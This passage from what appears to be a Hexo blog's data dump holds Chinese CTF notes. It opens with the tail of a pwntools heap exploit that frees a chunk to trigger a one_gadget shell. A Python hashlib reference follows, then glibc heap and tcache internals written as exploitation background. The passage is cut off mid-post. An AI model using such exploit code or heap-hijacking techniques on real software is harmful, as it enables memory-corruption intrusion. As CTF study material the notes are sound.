class=\"comment\">#list[3]:3</span></span><br><span class=\"line\"><span class=\"comment\">#list[4]:9</span></span><br><span class=\"line\"><span class=\"comment\">#list[5]:8</span></span><br><span class=\"line\"><span class=\"comment\">#list[6]:7</span></span><br><span class=\"line\"><span class=\"comment\">#list[7]:6</span></span><br><span class=\"line\"><span class=\"comment\">#list[8]:0</span></span><br><span class=\"line\"><span class=\"comment\">#list[9]:4</span></span><br><span class=\"line\"><span class=\"comment\">#list[10]:5=&gt;2</span></span><br><span class=\"line\"><span class=\"comment\">#list[11]:5</span></span><br><span class=\"line\"><span class=\"comment\">#list[12]:15</span></span><br><span class=\"line\"><span class=\"comment\">#list[13]:16</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#调用free,执行one_gadget</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Your choice:\\n&quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">2</span>))</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Index\\n&quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">0</span>))</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Input offset:\\n&quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">0</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>"},{"title":"hashlib","date":"2023-03-16T02:49:42.000Z","_content":"\nhashlib是一个提供了一些流行的hash(摘要)算法的Python标准库．其中所包括的算法有 md5, sha1, sha224, sha256, sha384, sha512等\n摘要算法又称hash算法、散列算法。它通过一个函数，把任意长度的数据转换为一个长度固定的数据串（通常用16进制的字符串表示）。\n\n```py\nhashlib.algorithms\n#列出所有加密算法\n\nh.digest_size\n#产生的散列字节大小。\n\nh.block_size\n#哈希内部块的大小\n```\n\n\n\n<!--more-->\n\n### 选择加密算法\n\n```py\n# 导入hashlib\nimport hashlib\n# 创建md5对象，其他算法也类似\nmd5=hashlib.md5()\n```\n\n### 传入明文数据\n\n```py\n# 使用update函数传入明文数据，需要设置编码方式\nmd5.update('...'.encode(encoding='...'))\n# 多次使用update传输与一次传输完是一样的\nmd5.update('.'.encode(encoding='...'))\nmd5.update('.'.encode(encoding='...'))\nmd5.update('.'.encode(encoding='...'))\n```\n\n### 获取加密密文\n\n```py\n# 返回摘要，作为二进制数据字符串值\nres=md5.digest()\n# 返回摘要，作为十六进制数据字符串值\nres=md5.hexdigest()\n\n# 可使用以下方法获取二进制串\nb''\nstr.encode()\nbytes()\n```\n\n### 其他\n\n```py\n# 复制\nhash.copy()\n```\n\n","source":"_posts/hashlib.md","raw":"---\ntitle: hashlib\ndate: 2023-03-16 10:49:42\ncategories: \n- crypto\ntags: \n- crypto\n \n\n---\n\nhashlib是一个提供了一些流行的hash(摘要)算法的Python标准库．其中所包括的算法有 md5, sha1, sha224, sha256, sha384, sha512等\n摘要算法又称hash算法、散列算法。它通过一个函数，把任意长度的数据转换为一个长度固定的数据串（通常用16进制的字符串表示）。\n\n```py\nhashlib.algorithms\n#列出所有加密算法\n\nh.digest_size\n#产生的散列字节大小。\n\nh.block_size\n#哈希内部块的大小\n```\n\n\n\n<!--more-->\n\n### 选择加密算法\n\n```py\n# 导入hashlib\nimport hashlib\n# 创建md5对象，其他算法也类似\nmd5=hashlib.md5()\n```\n\n### 传入明文数据\n\n```py\n# 使用update函数传入明文数据，需要设置编码方式\nmd5.update('...'.encode(encoding='...'))\n# 多次使用update传输与一次传输完是一样的\nmd5.update('.'.encode(encoding='...'))\nmd5.update('.'.encode(encoding='...'))\nmd5.update('.'.encode(encoding='...'))\n```\n\n### 获取加密密文\n\n```py\n# 返回摘要，作为二进制数据字符串值\nres=md5.digest()\n# 返回摘要，作为十六进制数据字符串值\nres=md5.hexdigest()\n\n# 可使用以下方法获取二进制串\nb''\nstr.encode()\nbytes()\n```\n\n### 其他\n\n```py\n# 复制\nhash.copy()\n```\n\n","slug":"hashlib","published":1,"updated":"2023-03-16T05:11:02.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czafx003h5oud2rvxftn8","content":"<p>hashlib是一个提供了一些流行的hash(摘要)算法的Python标准库．其中所包括的算法有 md5, sha1, sha224, sha256, sha384, sha512等<br>摘要算法又称hash算法、散列算法。它通过一个函数，把任意长度的数据转换为一个长度固定的数据串（通常用16进制的字符串表示）。</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hashlib.algorithms</span><br><span class=\"line\"><span class=\"comment\">#列出所有加密算法</span></span><br><span class=\"line\"></span><br><span class=\"line\">h.digest_size</span><br><span class=\"line\"><span class=\"comment\">#产生的散列字节大小。</span></span><br><span class=\"line\"></span><br><span class=\"line\">h.block_size</span><br><span class=\"line\"><span class=\"comment\">#哈希内部块的大小</span></span><br></pre></td></tr></table></figure>\n\n\n\n<span id=\"more\"></span>\n\n<h3 id=\"选择加密算法\"><a href=\"#选择加密算法\" class=\"headerlink\" title=\"选择加密算法\"></a>选择加密算法</h3><figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 导入hashlib</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> hashlib</span><br><span class=\"line\"><span class=\"comment\"># 创建md5对象，其他算法也类似</span></span><br><span class=\"line\">md5=hashlib.md5()</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"传入明文数据\"><a href=\"#传入明文数据\" class=\"headerlink\" title=\"传入明文数据\"></a>传入明文数据</h3><figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 使用update函数传入明文数据，需要设置编码方式</span></span><br><span class=\"line\">md5.update(<span class=\"string\">&#x27;...&#x27;</span>.encode(encoding=<span class=\"string\">&#x27;...&#x27;</span>))</span><br><span class=\"line\"><span class=\"comment\"># 多次使用update传输与一次传输完是一样的</span></span><br><span class=\"line\">md5.update(<span class=\"string\">&#x27;.&#x27;</span>.encode(encoding=<span class=\"string\">&#x27;...&#x27;</span>))</span><br><span class=\"line\">md5.update(<span class=\"string\">&#x27;.&#x27;</span>.encode(encoding=<span class=\"string\">&#x27;...&#x27;</span>))</span><br><span class=\"line\">md5.update(<span class=\"string\">&#x27;.&#x27;</span>.encode(encoding=<span class=\"string\">&#x27;...&#x27;</span>))</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"获取加密密文\"><a href=\"#获取加密密文\" class=\"headerlink\" title=\"获取加密密文\"></a>获取加密密文</h3><figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 返回摘要，作为二进制数据字符串值</span></span><br><span class=\"line\">res=md5.digest()</span><br><span class=\"line\"><span class=\"comment\"># 返回摘要，作为十六进制数据字符串值</span></span><br><span class=\"line\">res=md5.hexdigest()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 可使用以下方法获取二进制串</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"built_in\">str</span>.encode()</span><br><span class=\"line\"><span class=\"built_in\">bytes</span>()</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"其他\"><a href=\"#其他\" class=\"headerlink\" title=\"其他\"></a>其他</h3><figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 复制</span></span><br><span class=\"line\"><span class=\"built_in\">hash</span>.copy()</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"<p>hashlib是一个提供了一些流行的hash(摘要)算法的Python标准库．其中所包括的算法有 md5, sha1, sha224, sha256, sha384, sha512等<br>摘要算法又称hash算法、散列算法。它通过一个函数，把任意长度的数据转换为一个长度固定的数据串（通常用16进制的字符串表示）。</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hashlib.algorithms</span><br><span class=\"line\"><span class=\"comment\">#列出所有加密算法</span></span><br><span class=\"line\"></span><br><span class=\"line\">h.digest_size</span><br><span class=\"line\"><span class=\"comment\">#产生的散列字节大小。</span></span><br><span class=\"line\"></span><br><span class=\"line\">h.block_size</span><br><span class=\"line\"><span class=\"comment\">#哈希内部块的大小</span></span><br></pre></td></tr></table></figure>","more":"<h3 id=\"选择加密算法\"><a href=\"#选择加密算法\" class=\"headerlink\" title=\"选择加密算法\"></a>选择加密算法</h3><figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 导入hashlib</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> hashlib</span><br><span class=\"line\"><span class=\"comment\"># 创建md5对象，其他算法也类似</span></span><br><span class=\"line\">md5=hashlib.md5()</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"传入明文数据\"><a href=\"#传入明文数据\" class=\"headerlink\" title=\"传入明文数据\"></a>传入明文数据</h3><figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 使用update函数传入明文数据，需要设置编码方式</span></span><br><span class=\"line\">md5.update(<span class=\"string\">&#x27;...&#x27;</span>.encode(encoding=<span class=\"string\">&#x27;...&#x27;</span>))</span><br><span class=\"line\"><span class=\"comment\"># 多次使用update传输与一次传输完是一样的</span></span><br><span class=\"line\">md5.update(<span class=\"string\">&#x27;.&#x27;</span>.encode(encoding=<span class=\"string\">&#x27;...&#x27;</span>))</span><br><span class=\"line\">md5.update(<span class=\"string\">&#x27;.&#x27;</span>.encode(encoding=<span class=\"string\">&#x27;...&#x27;</span>))</span><br><span class=\"line\">md5.update(<span class=\"string\">&#x27;.&#x27;</span>.encode(encoding=<span class=\"string\">&#x27;...&#x27;</span>))</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"获取加密密文\"><a href=\"#获取加密密文\" class=\"headerlink\" title=\"获取加密密文\"></a>获取加密密文</h3><figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 返回摘要，作为二进制数据字符串值</span></span><br><span class=\"line\">res=md5.digest()</span><br><span class=\"line\"><span class=\"comment\"># 返回摘要，作为十六进制数据字符串值</span></span><br><span class=\"line\">res=md5.hexdigest()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 可使用以下方法获取二进制串</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"built_in\">str</span>.encode()</span><br><span class=\"line\"><span class=\"built_in\">bytes</span>()</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"其他\"><a href=\"#其他\" class=\"headerlink\" title=\"其他\"></a>其他</h3><figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 复制</span></span><br><span class=\"line\"><span class=\"built_in\">hash</span>.copy()</span><br></pre></td></tr></table></figure>"},{"title":"Heap Struct","date":"2023-01-01T16:00:40.000Z","_content":"堆是由操作系统内核或堆管理器**动态**分配的，只有在程序需要时才会被分配。\n在程序运行过程中，堆可以提供动态分配的内存，允许程序申请**大小未知**的内存。堆其实就是程序虚拟地址空间的一块**连续的线性**区域，它由**低地址向高地址**方向增长。\n\n堆通常由堆管理器ptmalloc2来管理，堆管理器位于内核层和用户层之间，会响应用户的请求并管理堆。系统调用开销巨大，只有堆管理器不能满足需求时，才会调用系统内核进行操作。\n\n需要注意的是，在内存分配与使用的过程中，Linux有这样的一个基本内存管理思想，**只有当真正访问一个地址的时候，系统才会建立虚拟页面与物理页面的映射关系**。 所以虽然操作系统已经给程序分配了很大的一块内存，但是这块内存其实只是虚拟内存。只有当用户使用到相应的内存时，系统才会真正分配物理页面给用户使用。\n<!--more-->\n## 堆的微观结构\n\n### chunk\n\n```c\nstruct malloc_chunk\n{\n    //当物理地址上的前一个chunk在使用时，prev_size用于存放前一个chunk的数据，否则，如果前一个chunk被释放了，则存放前一个chunk的大小\n    INTERNAL_SIZE_T prev_size;  \n    //存放当前chunk的实际大小（包含prev_size和size字段），chunk的大小都为2*SIZE_SZ(SIZE_SZ 32bit为4byte，64bit为8byte)的整数倍，因此size的后面3位都不会用上，被用于作为标志位。\n    //最低位为prev_inuse，用于指示前一个chunk是否释放，prev_inuse==1为使用，==0为释放\n    //第二位指示是否为memory_mapped分配的内存，1表示是，0 表示是 heap\n    //第三位指示是否是主分配区main_arena分配的内存，1表示不是，0表示是\n    INTERNAL_SIZE_T size;\n    \n    //下面为user data部分，用户申请到的指针指向的是下面的部分，若chunk被使用则下面的内存全部用于存放数据，否则才会有下面的结构\n\n    //fd和bk用于bin中链表连接，fd指向下一个，bk指向前一个。\n    struct malloc_chunk* fd;\n    struct malloc_chunk* bk;\n\n    //fd_nextsize和bk_nextsize用于large bin，分别指向前一个或后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针（因为large bin中同一头结点下的chunk的大小不一定相同，large bin允许有一定的公差）\n    struct malloc_chunk* fd_nextsize;\n    struct malloc_chunk* bk_nextsize;\n}\n```\n\n### bin\n\n为了减少开销，释放chunk的时候，堆管理器不会马上返回给内核，而是用bin对chunk进行暂时的管理。这样，当再次用户再次申请内存的时候，先从chunk中查找是否有正好满足的，如果有则直接取出，达到减少系统调用的次数的目的。\n\n为了方便管理，堆管理器按照chunk的大小，将bin分为4类，分别管理不同大小的chunk，分别为fast bins,small bins,large bins和unsorted bin。除了unsorted bin之外，其他的每种bin都会维护多个链表，根据chunk的大小再进行细分。**fast bin由fastbinY数组管理，其余的unsorted bin,small bin,large bin则由一个bin数组管理。**\n\n### fast bins\n\nfast bin是所有bin中操作最快的，也是最常用的，通常存放0x10到0x80的chunk，当在fast bins范围内的chunk被释放时，会**直接**被放到fast bins中。fastbinY这个数组用于实现fast bin，这个数组保存了fast bin的头结点，每一个头结点都指向同一大小的fast bin chunk，**头结点的prev_size和size字段被省去**。\n\nfast bin中采用**单向链表**对chunk进行组织,**即仅使用fd指针**，并且遵循**LIFO(先进后出)**的原则，fast bin的**头结点会指向最后一个**加入该fast bin的chunk。加入chunk时，先让chunk指向头结点指向的chunk，再让头结点指向该chunk；取出chunk的时候通过头结点取出最后加入的chunk。\n\nfast bin中的chunk大小都比较小，因为小的内存经常会用到，但如果释放后就被合并，那么下次申请时就会再需要分割，fast bin会减少这种合并，**fast bin chunk的prev_inuse位都为1，用于防止合并**。\n\nfast bin特性：\n\n1. fast bin使用fd，通过单向链表对chunk进行组织\n2. fast bin遵循LIFO的规则\n3. fast bin chunk prev_inuse位为1，不会被合并\n4. fast bin中fd指向的是prev_size位置，也就是chunk的开头位置\n5. 大小在fast bin范围内的chunk被释放时会直接放入fast bin(如果没有tcache或tcache满了)\n\n### unsorted bin\n\nunsorted bin中存放的是**不符合fast bin大小且不与top chunk相邻**的chunk，当这样的chunk会释放的时候，**首先**会被放入unsorted bin,作为放入small bin和large bin的**缓冲**，**unsorted bin的头结点中的pre_size和size都被省去，只有fd和bk有作用**。\n\nunsorted bin 处于bin[1]处，因此unsorted bin 只有一个链表。unsorted bin 中的空闲 chunk 处于**乱序**状态，主要有两个来源：\n\n（1）当一个较大的 chunk 被**分割**成两半后，如果剩下的部分**大于MINSIZE(chunk的最小大小)**，就会被放到 unsorted bin 中。\n\n（2）释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。\n\nunsorted Bin 在使用的过程中，采用的遍历顺序是 **FIFO** ，并且使用fd和bk通过**双向链表**进行连接。**当unsorted chunk中只有一个chunk的时候，那一个chunk的fd和bk都会指向的unsorted bin的头结点**。\n\nunsorted bin的特性：\n\n1. unsorted bin只有一个\n2. unsorted bin遵循FIFO的规则\n3. unsorted bin使用fd和bk，通过双向链表连接chunk\n4. 当unsorted bin只有一个chunk的时候，chunk的fd和bk都会指向unsorted bin的头结点（通常是main_arena+88高版本可能会+96）\n5. 不属于fast bin且不与top chunk相邻的chunk被释放时会放入unsorted bin\n6. 被分割后剩下的chunk如果大于chunk的最小大小，则会加入unsorted bin\n\n### small bins\n\nsmall bins在bin中从bin[2]一直到bin[63],存放的是小于512B的chunk，**工作范围包含了fast bins**,small bins 中每个 chunk 的大小与其所在的 bin 的 index 的关系为：chunk_size = 2 * SIZE_SZ *index\n\nsmall bins中一共有62个循环双向链表，每个链表中存储的chunk**大小都一致**。此外，small bins中遵循**FIFO**的规则，所以同一个链表中先被释放的chunk会先被分配出去，bin的头结点指向**最后被释放的chunk**，也就是说，**离bin头结点最远的chunk最先被分配**。\n\n\nsmall bins的特性：\n\n1. small bins在bin中的index从2到63，共62个\n2. 一个bin中的chunk的大小都相等，chunk_size=2 * SIZE_SZ * index\n3. small bins遵循FIFO的规则\n4. small bins使用fd和bk，通过双向链表连接chunk\n\n### large bins\n\nlarge bins在bin中从bin[64]一直到bin[126],存放的是大于512B的chunk。bin中的每个chunk的**大小不一定相同**，但都是**在一定范围之内**。此外，63个bin被分为6类，每类bin中chunk的**公差一致**，第一类有32个，公差为64B，第二类有16个，公差为512B，第三类有8个，公差为4096B，第四类有4个，公差为32768B，第五类有2个，公差为262144B，第六类有1个，公差不限制。\n\nlarge bins采用双向链表进行连接，除了fd和bk的双向链表连接同一个large bin中前后的chunk之外，**large bin中还会利用fd_nextsize和bk_nextsize进行连接**。\n\nlarge bin中的chunk按照**大小顺序**排列，**最大的接在头结点后**，最小的接在尾部。\n\nfd_nextsize和bk_nextsize用于连接同一个large bin下不同大小的chunk，**fd_nextsize会连接下一个比当前小的chunk，bk_nextsize会链接前一个比当前大的chunk**，对相同大小的chunk，只有**第一个**chunk的fd_nextsize和bk_nextsize会指向，其余的都会赋0。\n\nfd_nextsize和bk_nextsize也构成了一个**双向的循环链表**，如果large bin中chunk的大小都相同，那么第一个chunk的fd_nextsize和bk_nextsize都会指向自己。\n\nlarge bins的特性：\n\n1. large bins在bin中的index从64到126,共63个\n2. 一个large bin中的chunk的大小不一定相同，但都在一定范围（公差）内\n3. 63个large bin中被分为6类，每类的公差相同\n4. large bin中的chunk按由大到小的顺序排布，头结点接的是最大的chunk\n5. large bin使用fd和bk，通过双向链表连接\n6. large bin利用fd_nextsize和bk_nextsize，指向比当前小和比当前大的chunk，构成双向循环链表\n7. large bin取出时会首先取出离头结点最近的（LIFO）\n\n\n### top chunk\n\ntop chunk 就是处于当前堆的物理地址最高的chunk。程序第一次进行malloc的时候，heap会被分为两块，低地址的一块给用户，剩下的那块就是top chunk。\n\ntop chunk虽然没被使用，但是不属于任何一个bin，当bin中的chunk不能满足用户需要时，就会**从top chunk中分割新的chunk**，余下的部分将作为新的top chunk。\n\n当释放的chunk与top chunk相邻且不在fast bin的范围内，那么这个chunk会被**合并**到top chunk中。因此，top chunk的**prev_inuse位始终为1**，否则前一个chunk就会被合并。\n\n### last remainder\n\n在用户使用 malloc 请求分配内存时，ptmalloc2 找到的 chunk 可能并不和申请的内存大小一致，这时候就将**分割之后的剩余部分**称之为last remainder chunk，unsort bin 也会存这一块。top chunk 分割剩下的部分不会作为last remainder.\n\n### tcache\n\n在glibc2.26之后引入的新技术，提高了性能，但是由于**舍弃了许多安全检查**，带来了不小的风险。\n\ntcache的结构与fast bin有些类似，都是利用**fd通过单向链表**将**相同大小**的chunk链起来，且**prev_inuse==1**，但不同的是tcache中**fd指向的是user data而不是chunk_addr**。\n\n具体结构：\n\n每个线程都会维护一个tcache_perthread_struct，是整个tcache的管理结构，一共有TCACHE_MAX_BINS个计数器和TCACHE_MAX_BINS个tcache_entry。\n\n```c\ntypedef struct tcache_perthread_struct\n{\n  char counts[TCACHE_MAX_BINS];\n  tcache_entry *entries[TCACHE_MAX_BINS];\n} tcache_perthread_struct;\n\n# define TCACHE_MAX_BINS                64\n```\n\n**tcache_entry就相当于是fast bin的头结点**，后面连接大小相同的chunk;其中的count记录了tcache_entry连接的free chunk的个数，一般最多为**7**个，**超过7个则放入其他的bin**。\n\n`tcache_perthread_struct`本身也是一个堆块，大小为0x250，位于堆的开头。（**因此可以被劫持**）\n\ntcache与fast bin类似，是采用LIFO的单链表，每个bin内存在的堆块大小相同，大小从24~1032字节，一般每个bin最多存放7个。\n\n工作方式：\n\n在free的时候，会**优先考虑放入tcache中**，tcache中没有空位才会加入fast bin或者unsorted bin。与fast bin类似，tcache中chunk的**prev_inuse位为1**。\n\n在malloc的时候，也会**优先从tcache中取出chunk（如果size在tcache范围0x408内）**，如果tcache是空的，但fast bin、smalll bin中有对应size的chunk的话，则会**将对应头结点下的其他chunk**移到tcache的对应tcache_entry处，直到tcache被填满或bin被清空。如果是unsorted bin的话，则会将**所有chunk**移到tcache中继续处理。\n\ntcache采用tcache_put()和tcache_get()对chunk进行存取，这两个操作几乎没有安全保护，这是让tcache_entry[idx]指向新放入的chunk或取出tcache_entry[idx]指向的chunk，再修改count，并且不会修改prev_inuse。\n\n","source":"_posts/heap struct.md","raw":"---\ntitle: Heap Struct\ndate: 2023-01-02 00:00:40\ncategories: \n- pwn\ntags: \n- pwn\n- heap \n---\n堆是由操作系统内核或堆管理器**动态**分配的，只有在程序需要时才会被分配。\n在程序运行过程中，堆可以提供动态分配的内存，允许程序申请**大小未知**的内存。堆其实就是程序虚拟地址空间的一块**连续的线性**区域，它由**低地址向高地址**方向增长。\n\n堆通常由堆管理器ptmalloc2来管理，堆管理器位于内核层和用户层之间，会响应用户的请求并管理堆。系统调用开销巨大，只有堆管理器不能满足需求时，才会调用系统内核进行操作。\n\n需要注意的是，在内存分配与使用的过程中，Linux有这样的一个基本内存管理思想，**只有当真正访问一个地址的时候，系统才会建立虚拟页面与物理页面的映射关系**。 所以虽然操作系统已经给程序分配了很大的一块内存，但是这块内存其实只是虚拟内存。只有当用户使用到相应的内存时，系统才会真正分配物理页面给用户使用。\n<!--more-->\n## 堆的微观结构\n\n### chunk\n\n```c\nstruct malloc_chunk\n{\n    //当物理地址上的前一个chunk在使用时，prev_size用于存放前一个chunk的数据，否则，如果前一个chunk被释放了，则存放前一个chunk的大小\n    INTERNAL_SIZE_T prev_size;  \n    //存放当前chunk的实际大小（包含prev_size和size字段），chunk的大小都为2*SIZE_SZ(SIZE_SZ 32bit为4byte，64bit为8byte)的整数倍，因此size的后面3位都不会用上，被用于作为标志位。\n    //最低位为prev_inuse，用于指示前一个chunk是否释放，prev_inuse==1为使用，==0为释放\n    //第二位指示是否为memory_mapped分配的内存，1表示是，0 表示是 heap\n    //第三位指示是否是主分配区main_arena分配的内存，1表示不是，0表示是\n    INTERNAL_SIZE_T size;\n    \n    //下面为user data部分，用户申请到的指针指向的是下面的部分，若chunk被使用则下面的内存全部用于存放数据，否则才会有下面的结构\n\n    //fd和bk用于bin中链表连接，fd指向下一个，bk指向前一个。\n    struct malloc_chunk* fd;\n    struct malloc_chunk* bk;\n\n    //fd_nextsize和bk_nextsize用于large bin，分别指向前一个或后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针（因为large bin中同一头结点下的chunk的大小不一定相同，large bin允许有一定的公差）\n    struct malloc_chunk* fd_nextsize;\n    struct malloc_chunk* bk_nextsize;\n}\n```\n\n### bin\n\n为了减少开销，释放chunk的时候，堆管理器不会马上返回给内核，而是用bin对chunk进行暂时的管理。这样，当再次用户再次申请内存的时候，先从chunk中查找是否有正好满足的，如果有则直接取出，达到减少系统调用的次数的目的。\n\n为了方便管理，堆管理器按照chunk的大小，将bin分为4类，分别管理不同大小的chunk，分别为fast bins,small bins,large bins和unsorted bin。除了unsorted bin之外，其他的每种bin都会维护多个链表，根据chunk的大小再进行细分。**fast bin由fastbinY数组管理，其余的unsorted bin,small bin,large bin则由一个bin数组管理。**\n\n### fast bins\n\nfast bin是所有bin中操作最快的，也是最常用的，通常存放0x10到0x80的chunk，当在fast bins范围内的chunk被释放时，会**直接**被放到fast bins中。fastbinY这个数组用于实现fast bin，这个数组保存了fast bin的头结点，每一个头结点都指向同一大小的fast bin chunk，**头结点的prev_size和size字段被省去**。\n\nfast bin中采用**单向链表**对chunk进行组织,**即仅使用fd指针**，并且遵循**LIFO(先进后出)**的原则，fast bin的**头结点会指向最后一个**加入该fast bin的chunk。加入chunk时，先让chunk指向头结点指向的chunk，再让头结点指向该chunk；取出chunk的时候通过头结点取出最后加入的chunk。\n\nfast bin中的chunk大小都比较小，因为小的内存经常会用到，但如果释放后就被合并，那么下次申请时就会再需要分割，fast bin会减少这种合并，**fast bin chunk的prev_inuse位都为1，用于防止合并**。\n\nfast bin特性：\n\n1. fast bin使用fd，通过单向链表对chunk进行组织\n2. fast bin遵循LIFO的规则\n3. fast bin chunk prev_inuse位为1，不会被合并\n4. fast bin中fd指向的是prev_size位置，也就是chunk的开头位置\n5. 大小在fast bin范围内的chunk被释放时会直接放入fast bin(如果没有tcache或tcache满了)\n\n### unsorted bin\n\nunsorted bin中存放的是**不符合fast bin大小且不与top chunk相邻**的chunk，当这样的chunk会释放的时候，**首先**会被放入unsorted bin,作为放入small bin和large bin的**缓冲**，**unsorted bin的头结点中的pre_size和size都被省去，只有fd和bk有作用**。\n\nunsorted bin 处于bin[1]处，因此unsorted bin 只有一个链表。unsorted bin 中的空闲 chunk 处于**乱序**状态，主要有两个来源：\n\n（1）当一个较大的 chunk 被**分割**成两半后，如果剩下的部分**大于MINSIZE(chunk的最小大小)**，就会被放到 unsorted bin 中。\n\n（2）释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。\n\nunsorted Bin 在使用的过程中，采用的遍历顺序是 **FIFO** ，并且使用fd和bk通过**双向链表**进行连接。**当unsorted chunk中只有一个chunk的时候，那一个chunk的fd和bk都会指向的unsorted bin的头结点**。\n\nunsorted bin的特性：\n\n1. unsorted bin只有一个\n2. unsorted bin遵循FIFO的规则\n3. unsorted bin使用fd和bk，通过双向链表连接chunk\n4. 当unsorted bin只有一个chunk的时候，chunk的fd和bk都会指向unsorted bin的头结点（通常是main_arena+88高版本可能会+96）\n5. 不属于fast bin且不与top chunk相邻的chunk被释放时会放入unsorted bin\n6. 被分割后剩下的chunk如果大于chunk的最小大小，则会加入unsorted bin\n\n### small bins\n\nsmall bins在bin中从bin[2]一直到bin[63],存放的是小于512B的chunk，**工作范围包含了fast bins**,small bins 中每个 chunk 的大小与其所在的 bin 的 index 的关系为：chunk_size = 2 * SIZE_SZ *index\n\nsmall bins中一共有62个循环双向链表，每个链表中存储的chunk**大小都一致**。此外，small bins中遵循**FIFO**的规则，所以同一个链表中先被释放的chunk会先被分配出去，bin的头结点指向**最后被释放的chunk**，也就是说，**离bin头结点最远的chunk最先被分配**。\n\n\nsmall bins的特性：\n\n1. small bins在bin中的index从2到63，共62个\n2. 一个bin中的chunk的大小都相等，chunk_size=2 * SIZE_SZ * index\n3. small bins遵循FIFO的规则\n4. small bins使用fd和bk，通过双向链表连接chunk\n\n### large bins\n\nlarge bins在bin中从bin[64]一直到bin[126],存放的是大于512B的chunk。bin中的每个chunk的**大小不一定相同**，但都是**在一定范围之内**。此外，63个bin被分为6类，每类bin中chunk的**公差一致**，第一类有32个，公差为64B，第二类有16个，公差为512B，第三类有8个，公差为4096B，第四类有4个，公差为32768B，第五类有2个，公差为262144B，第六类有1个，公差不限制。\n\nlarge bins采用双向链表进行连接，除了fd和bk的双向链表连接同一个large bin中前后的chunk之外，**large bin中还会利用fd_nextsize和bk_nextsize进行连接**。\n\nlarge bin中的chunk按照**大小顺序**排列，**最大的接在头结点后**，最小的接在尾部。\n\nfd_nextsize和bk_nextsize用于连接同一个large 